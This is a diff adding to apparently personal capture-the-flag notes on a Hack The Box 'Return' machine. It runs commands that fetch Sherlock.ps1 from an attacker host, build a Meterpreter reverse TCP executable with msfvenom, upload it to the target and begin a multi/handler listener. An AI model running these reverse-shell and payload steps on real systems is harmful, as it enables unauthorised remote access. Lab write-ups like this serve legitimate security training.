@@ -28,3 +28,27 @@ USERDNSDOMAIN: return.local
 ```
 IWR -Uri http://10.10.16.20:8080/opt/windows_tools/Sherlock.ps1 -OutFile /opt/windows_tools/Sherlock.ps1
 ```
+![[Pasted image 20240506022418.png]]
+
+```
+net user svc-printer
+```
+![[Pasted image 20240506022345.png]]
+
+The only thing coming to my mind is Meterpreter shell and Msfvenom
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.16.20 LPORT=4242
+```
+![[Pasted image 20240506022907.png]]
+
+```
+upload HackTheBox/Return/shell.exe
+```
+![[Pasted image 20240506023311.png]]
+
+
+Now will configure the Msfconsle before running the shell.exe
+```
+use exploit/multi/handler 
+```
